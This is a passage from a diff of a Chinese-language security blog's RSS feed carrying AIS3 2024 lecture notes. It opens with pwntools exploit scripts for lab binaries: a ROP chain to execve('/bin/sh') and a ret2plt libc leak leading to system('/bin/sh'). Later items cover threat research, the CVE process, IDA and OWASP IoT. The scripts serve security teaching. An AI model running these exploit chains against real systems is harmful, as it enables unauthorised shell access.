+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;/bin/sh&lt;/span>&lt;span style="color:#f1fa8c">\x00&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;&lt;/span> 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#ff79c6">+=&lt;/span> p64(pop_rax)&lt;span style="color:#ff79c6">+&lt;/span> p64(&lt;span style="color:#bd93f9">59&lt;/span>)&lt;span style="color:#ff79c6">+&lt;/span>p64(pop_rsi) &lt;span style="color:#ff79c6">+&lt;/span> p64(&lt;span style="color:#bd93f9">0&lt;/span>) &lt;span style="color:#ff79c6">+&lt;/span> p64(pop_rdi)&lt;span style="color:#ff79c6">+&lt;/span>p64(name)&lt;span style="color:#ff79c6">+&lt;/span>p64(pop_rdx_rbx)&lt;span style="color:#ff79c6">+&lt;/span> p64(&lt;span style="color:#bd93f9">0&lt;/span>) &lt;span style="color:#ff79c6">+&lt;/span>p64(&lt;span style="color:#bd93f9">0&lt;/span>)&lt;span style="color:#ff79c6">+&lt;/span>p64( syscall)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendlineafter(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;What is your name? &amp;#34;&lt;/span>, payload)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>recvuntil(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;You have a buffer overflow vuln: &amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>offset &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x10&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>padding &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">*&lt;/span>offset
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#ff79c6">=&lt;/span> flat([padding, name, leave_ret])
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(payload)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>interactive()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="tricks-in-dynamic-link-library-which-generated-by-new-compiler">Tricks in dynamic link library which generated by new compiler&lt;/h2>
+&lt;h3 id="lab03-solution">lab03 solution&lt;/h3>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">#!/usr/bin/env python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">from&lt;/span> pwn &lt;span style="color:#ff79c6">import&lt;/span> &lt;span style="color:#ff79c6">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"># ret2plt&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>elf &lt;span style="color:#ff79c6">=&lt;/span> context&lt;span style="color:#ff79c6">.&lt;/span>binary &lt;span style="color:#ff79c6">=&lt;/span> ELF(&lt;span style="color:#f1fa8c">&amp;#39;./rop3&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>os &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;linux&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>arch &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;amd64&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#ff79c6">.&lt;/span>log_level &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;DEBUG&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span> args&lt;span style="color:#ff79c6">.&lt;/span>REMOTE:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;35.229.243.81&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> port &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">10103&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> remote(ip, port)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#ff79c6">=&lt;/span> process()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>read_got &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x404020&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x4011f9&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ret &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x40101a&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>printf_plt &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x401060&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>main &lt;span style="color:#ff79c6">=&lt;/span> elf&lt;span style="color:#ff79c6">.&lt;/span>sym[&lt;span style="color:#f1fa8c">&amp;#39;main&amp;#39;&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendlineafter(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;What is your name? &amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;1234&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>recvuntil(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;You have a buffer overflow vuln: &amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>offset &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x18&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>padding &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#ff79c6">*&lt;/span>offset
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#ff79c6">=&lt;/span> padding &lt;span style="color:#ff79c6">+&lt;/span> p64(ret) &lt;span style="color:#ff79c6">+&lt;/span> p64(pop_rdi) &lt;span style="color:#ff79c6">+&lt;/span> p64(read_got) &lt;span style="color:#ff79c6">+&lt;/span> p64(printf_plt) &lt;span style="color:#ff79c6">+&lt;/span> p64(ret) &lt;span style="color:#ff79c6">+&lt;/span> p64(main)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(payload)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>leak &lt;span style="color:#ff79c6">=&lt;/span> u64(p&lt;span style="color:#ff79c6">.&lt;/span>recv(&lt;span style="color:#bd93f9">6&lt;/span>)&lt;span style="color:#ff79c6">.&lt;/span>ljust(&lt;span style="color:#bd93f9">8&lt;/span>, &lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;&lt;/span>&lt;span style="color:#f1fa8c">\x00&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;&lt;/span>))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>info(&lt;span style="color:#8be9fd;font-style:italic">hex&lt;/span>(leak))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>leak_base &lt;span style="color:#ff79c6">=&lt;/span> leak &lt;span style="color:#ff79c6">-&lt;/span> &lt;span style="color:#bd93f9">0x1149c0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>system &lt;span style="color:#ff79c6">=&lt;/span> leak_base &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#bd93f9">0x50d70&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>binsh &lt;span style="color:#ff79c6">=&lt;/span> leak_base &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#bd93f9">0x1d8698&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendlineafter(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;What is your name? &amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#34;1234&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>recvuntil(&lt;span style="color:#f1fa8c">b&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;You have a buffer overflow vuln: &amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#ff79c6">=&lt;/span> padding &lt;span style="color:#ff79c6">+&lt;/span> p64(ret) &lt;span style="color:#ff79c6">+&lt;/span> p64(pop_rdi) &lt;span style="color:#ff79c6">+&lt;/span> p64(binsh) &lt;span style="color:#ff79c6">+&lt;/span> p64(system)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>sendline(payload)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p&lt;span style="color:#ff79c6">.&lt;/span>interactive()
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="lab04">lab04&lt;/h3>
+&lt;h2 id="srop">SROP&lt;/h2>
+&lt;h3 id="lab05">lab05&lt;/h3></description></item><item><title>【AIS3】永不停歇的競逐 - 威脅研究員與資安女力的挑戰</title><link>https://ja-errorpro.codes/posts/2024/ais3_d3_4/</link><pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d3_4/</guid><description>&lt;h1 id="永不停歇的競逐---威脅研究員與資安女力的挑戰">永不停歇的競逐 - 威脅研究員與資安女力的挑戰&lt;/h1>
 &lt;p>&lt;code>-TXOne Networks Inc. 威脅研究經理 Mars Cheng ＆ DEVCORE 技術專案經理 Hazel Yen&lt;/code>&lt;/p>
 &lt;h2 id="txone-介紹">TXOne 介紹&lt;/h2>
 &lt;ul>
@@ -374,7 +689,29 @@ RHOST: 10.129.11.184
 &lt;ul>
 &lt;li>手機鑑識&lt;/li>
 &lt;/ul>
-&lt;p>無法補洞 -&amp;gt; 高強度監控&lt;/p></description></item><item><title>【AIS3】深入淺出網域(AD)安全:細探各項AD組態設定的濫用</title><link>https://ja-errorpro.codes/posts/2024/ais3_d3_1/</link><pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d3_1/</guid><description>&lt;h1 id="深入淺出網域ad安全細探各項ad組態設定的濫用">深入淺出網域(AD)安全:細探各項AD組態設定的濫用&lt;/h1>
+&lt;p>無法補洞 -&amp;gt; 高強度監控&lt;/p>
+&lt;p>urgent/11&lt;/p>
+&lt;p>data-link bus&lt;/p>
+&lt;p>:star: cybersec, RSA (concept, 未來發展)
+多看 conference&lt;/p>
+&lt;h3 id="cve-流程">CVE 流程&lt;/h3>
+&lt;ul>
+&lt;li>廠商是 CNA
+&lt;ul>
+&lt;li>只有廠商或 ro ot CNA 可以核發自己的漏洞&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>不是 CNA
+&lt;ul>
+&lt;li>可以自己申請 CVE&lt;/li>
+&lt;li>由其他 CNA 核發&lt;/li>
+&lt;li>會記錄廠商不認定漏洞&lt;/li>
+&lt;li>廠商可不修補&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="opsec">OPSEC&lt;/h3>
+&lt;p>攻擊者行為在受監控下不會被偵測到&lt;/p></description></item><item><title>【AIS3】深入淺出網域(AD)安全:細探各項AD組態設定的濫用</title><link>https://ja-errorpro.codes/posts/2024/ais3_d3_1/</link><pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d3_1/</guid><description>&lt;h1 id="深入淺出網域ad安全細探各項ad組態設定的濫用">深入淺出網域(AD)安全:細探各項AD組態設定的濫用&lt;/h1>
 &lt;p>&lt;code>-TXOne Networks Inc. Threat Researcher Dexter Chen&lt;/code>&lt;/p>
 &lt;h2 id="教材">教材&lt;/h2>
 &lt;ul>
@@ -532,7 +869,38 @@ RHOST: 10.129.11.184
 &lt;/li>
 &lt;/ul>
 &lt;h3 id="回顧計算機組織">回顧計算機組織&lt;/h3>
-&lt;p>Source -&amp;gt; Transform -&amp;gt; Intermediate -&amp;gt; Execution&lt;/p></description></item><item><title>【AIS3】IDA 不只有 F5 可以按 IDA 101, Reverse 101</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_2/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_2/</guid><description>&lt;h1 id="ida-不只有-f5-可以按-ida-101-reverse-101">IDA 不只有 F5 可以按 IDA 101, Reverse 101&lt;/h1>
+&lt;p>Source -&amp;gt; Transform -&amp;gt; Intermediate -&amp;gt; Execution&lt;/p>
+&lt;ul>
+&lt;li>Source
+&lt;ul>
+&lt;li>Source Code&lt;/li>
+&lt;li>Serialized code&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Transform
+&lt;ul>
+&lt;li>Compile&lt;/li>
+&lt;li>Interpret
+&lt;ul>
+&lt;li>bytecode&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Intermediate
+&lt;ul>
+&lt;li>IL(中間碼) &amp;lt;- RASP&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Execution
+&lt;ul>
+&lt;li>VM&lt;/li>
+&lt;li>JIT&lt;/li>
+&lt;li>Machine code &amp;lt;- RASP&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>偵測 IL、Machine code&lt;/p></description></item><item><title>【AIS3】IDA 不只有 F5 可以按 IDA 101, Reverse 101</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_2/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_2/</guid><description>&lt;h1 id="ida-不只有-f5-可以按-ida-101-reverse-101">IDA 不只有 F5 可以按 IDA 101, Reverse 101&lt;/h1>
 &lt;p>&lt;code>-undefined 戰隊 林祐聖 ＆ 陳兆閔 ＆ TeamT5杜浦數位安全 RD 林哲宇&lt;/code>&lt;/p>
 &lt;h2 id="ida-介紹">IDA 介紹&lt;/h2>
 &lt;ul>
@@ -560,7 +928,19 @@ RHOST: 10.129.11.184
 &lt;li>紫 external symbol&lt;/li>
 &lt;li>白 regular func&lt;/li>
 &lt;/ul>
-&lt;p>搜尋:&lt;/p></description></item><item><title>【AIS3】IoT 檢測實務</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_3/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_3/</guid><description>&lt;h1 id="iot-檢測實務">IoT 檢測實務&lt;/h1>
+&lt;p>搜尋:&lt;/p>
+&lt;ul>
+&lt;li>直接輸入:從頭匹配&lt;/li>
+&lt;li>[ctrl+f5]:模糊搜尋&lt;/li>
+&lt;li>option-&amp;gt; general&lt;/li>
+&lt;/ul>
+&lt;h3 id="disassembly-view-graph">disassembly view (graph)&lt;/h3>
+&lt;ul>
+&lt;li>圖形化&lt;/li>
+&lt;/ul>
+&lt;p>若case夠多，會變成 jump table&lt;/p>
+&lt;h3 id="disassembly-view-text">disassembly view (text)&lt;/h3>
+&lt;p>優點:&lt;/p></description></item><item><title>【AIS3】IoT 檢測實務</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_3/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_3/</guid><description>&lt;h1 id="iot-檢測實務">IoT 檢測實務&lt;/h1>
 &lt;p>&lt;code>-中華資安國際 副理 王凱慶 Keniver&lt;/code>&lt;/p>
 &lt;h2 id="introduction">Introduction&lt;/h2>
 &lt;ul>
@@ -599,7 +979,27 @@ RHOST: 10.129.11.184
 &lt;h3 id="設備產業生態系">設備產業生態系&lt;/h3>
 &lt;p>由於硬體與其程式可以被重複利用與整合於其他產品中，因此ODM 廠商可能會與多間OEM 廠商合作，進而拓展經濟規模。
 這樣的架構下ODM 的硬體與軟體會被複製到多個OEM 產品上，若ODM 廠商未建立良善的安全開發流程，而OEM 廠商也只改個Logo 就將其出品，那就可能導致&lt;del>一家烤肉萬家香&lt;/del>一個漏洞萬家通用的現象發生。&lt;/p>
-&lt;p>華為 -&amp;gt; 海康衛視 -&amp;gt; SOC -&amp;gt; 雄邁 -&amp;gt; OVM 監視器廠商&lt;/p></description></item><item><title>【AIS3】從遊戲學 Windows Reverse - 除了 F5 之外還有哪幾招</title><link>https://ja-errorpro.codes/posts/2024/ais3_d2_4/</link><pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/ais3_d2_4/</guid><description>&lt;h1 id="從遊戲學-windows-reverse---除了-f5-之外還有哪幾招">從遊戲學 Windows Reverse - 除了 F5 之外還有哪幾招&lt;/h1>
+&lt;p>華為 -&amp;gt; 海康衛視 -&amp;gt; SOC -&amp;gt; 雄邁 -&amp;gt; OVM 監視器廠商&lt;/p>
+&lt;ul>
+&lt;li>登入頁面差不多&lt;/li>
+&lt;li>外觀&lt;/li>
+&lt;/ul>
+&lt;h3 id="為何研究-iot">為何研究 IoT&lt;/h3>
+&lt;ul>
+&lt;li>數量多, 通用性高, 洞好找&lt;/li>
+&lt;li>效能要求&lt;/li>
+&lt;li>廠商方便，不加保護&lt;/li>
+&lt;/ul>
+&lt;h2 id="owasp-iot-top-10">OWASP IoT Top 10&lt;/h2>
+&lt;h3 id="i1-weak-guessable-or-hardcoded-passwords">I1 Weak Guessable, or Hardcoded Passwords&lt;/h3>
+&lt;ul>
+&lt;li>弱密碼&lt;/li>
+&lt;/ul>
+&lt;h3 id="i2-insecure-network-services">I2 Insecure Network Services&lt;/h3>
+&lt;ul>
+&lt;li>運行不必要甚至不安全的網路服務&lt;/li>
+&lt;/ul>
